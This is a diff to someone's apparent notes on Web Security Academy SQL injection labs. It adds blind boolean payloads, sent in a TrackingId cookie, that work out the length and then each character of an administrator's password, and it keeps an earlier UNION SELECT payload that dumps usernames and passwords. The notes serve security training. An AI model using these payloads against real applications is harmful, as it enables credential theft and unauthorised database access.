@@ -57,3 +57,15 @@ Get data from table
 
 https://ac151f861ff1f580c06e17d600c3003d.web-security-academy.net/filter?category=Gifts' union SELECT username_pihapd,password_mpzlug FROM users_srqfep-- -
 
+# 10
+
+# 11
+finding password lenght
+
+	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+finding password characters
+
+	TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+check request_11.py
